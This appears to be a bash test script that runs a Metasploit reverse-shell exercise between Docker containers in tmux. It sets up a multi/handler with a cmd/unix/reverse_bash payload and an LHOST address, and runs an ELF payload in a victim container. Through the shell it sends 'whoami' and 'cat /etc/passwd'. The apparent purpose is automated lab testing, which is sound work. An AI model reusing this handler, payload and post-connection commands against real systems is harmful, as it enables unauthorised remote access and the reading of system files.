#!/bin/bash -e

SCRIPT_DIR="$(cd ${0%/*} && pwd -P)"
SESSION="MeterpreterTest"
LOG_PATH="/tmp/meterpreter_session.log"

configure() {
	cd $SCRIPT_DIR && docker-compose pull ms victim
	# Ensure tmux is installed
	which tmux || (sudo apt update && sudo apt install tmux)
}

configure

# Create a new detached tmux session
# tmux kill-session -t $SESSION || :
docker kill msfconsole 2>/dev/null || :
tmux new-session -d -s $SESSION || :

################################
####        Victim        ####
################################

# Select window for victim
# Alternatively, separate session might be used

VICTIM_LOG_PATH=/tmp/meter_victim.log
VICTIM_WINDOW=$(tmux list-windows | grep Victim | head -n 1 | cut -d ":" -f 1)
PAYLOAD=${PAYLOAD:-/tmp/payloads/shell-x86.elf}

if [[ -z "$VICTIM_WINDOW" ]]; then
	# Create a new window for the victim's Docker command
	tmux new-window -t $SESSION -n 'Victim'
	VICTIM_WINDOW=$(tmux list-windows -t $SESSION | cut -d: -f 1 | sort -n | tail -1)
fi

type_victim() {
	tmux send-keys -t $SESSION:$VICTIM_WINDOW "$@"
}

# Wait unecho til session is started
(
	while true; do
		# Wait until tcp
		if grep "Started reverse TCP handler" $LOG_PATH; then
			type_victim \
				"cd $SCRIPT_DIR && docker-compose run --rm  victim $PAYLOAD" C-m
			# type_victim C-m
		fi
		sleep 1
	done
) &

################################
####       Attacker       ####
################################

# Ensure only one instance of msf is launched
docker stop metasploit 2>/dev/null || :
rm $LOG_PATH 2>/dev/null || :

# Dynamically fetch the least window number
LEAST_WINDOW=$(tmux list-windows -t $SESSION | cut -d: -f1 | sort -n | head -1)
LEAST_PANE=$(tmux list-panes -t $SESSION | cut -d: -f1 | sort -n | head -1)
#
# Capture msf pane to the file
tmux pipe-pane -t $SESSION:$LEAST_WINDOW "tee > $LOG_PATH"

type_attacker() {
	tmux send-keys -t $SESSION:$LEAST_WINDOW.$LEAST_PANE "$@"
}

type_attacker 'bin/msfconsole' C-m
type_attacker 'use exploit/multi/handler' C-m
type_attacker 'set PAYLOAD cmd/unix/reverse_bash' C-m
type_attacker 'set LHOST 10.2.0.201' C-m
type_attacker 'run' C-m

# On the attacker window wait until victim connects
# with reverse shell, send test commands and exit
# (
while true; do
	if grep -q "Command shell session" $LOG_PATH; then
		sleep 1
		type_attacker 'whoami' C-m
		type_attacker 'cat /etc/passwd' C-m
		type_attacker 'exit' C-m

		sleep 1

		# Exit msf console
		# type_attacker C-d
		# Kill container as fallback method
		docker kill msfconsole 2>/dev/null || :

		# Ensure that tmux session is killed
		sleep 3 && tmux kill-session -t $SESSION 2>/dev/null || : &
		break
	fi
	sleep 1
done

# Late print commands executed in attacker console
cat $LOG_PATH
